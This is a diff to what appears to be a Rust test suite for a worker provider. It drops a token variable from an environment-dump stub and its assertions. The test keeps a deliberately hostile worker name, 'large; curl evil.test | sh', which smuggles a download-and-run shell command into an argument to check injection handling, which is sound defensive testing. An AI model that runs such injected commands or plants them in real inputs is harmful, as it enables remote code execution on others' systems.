@@ -154,7 +154,7 @@ done
 # Also dump a few env keys if present.
 env_out="${{out}}.env"
 : > "$env_out"
-for k in RIPCLONE_QUEUE RIPCLONE_TOKEN; do
+for k in RIPCLONE_QUEUE; do
   eval "v=\$$k"
   if [ -n "$v" ]; then
     printf '%s=%s\n' "$k" "$v" >> "$env_out"
@@ -216,7 +216,6 @@ done
         let nasty = "large; curl evil.test | sh";
         let mut env = BTreeMap::new();
         env.insert("RIPCLONE_QUEUE".into(), "libsql".into());
-        env.insert("RIPCLONE_TOKEN".into(), "secret-token".into());
 
         provider
             .ensure_worker(&WorkerSpec::new(nasty, env))
@@ -233,10 +232,7 @@ done
                 .map(|m| m.len() > 0)
                 .unwrap_or(false);
             let env_ready = std::fs::read_to_string(&env_out)
-                .map(|contents| {
-                    contents.contains("RIPCLONE_QUEUE=libsql")
-                        && contents.contains("RIPCLONE_TOKEN=secret-token")
-                })
+                .map(|contents| contents.contains("RIPCLONE_QUEUE=libsql"))
                 .unwrap_or(false);
             if argv_ready && env_ready {
                 break;
@@ -259,7 +255,6 @@ done
 
         let env_recorded = std::fs::read_to_string(env_out).unwrap();
         assert!(env_recorded.contains("RIPCLONE_QUEUE=libsql"));
-        assert!(env_recorded.contains("RIPCLONE_TOKEN=secret-token"));
     }
 
     #[tokio::test]
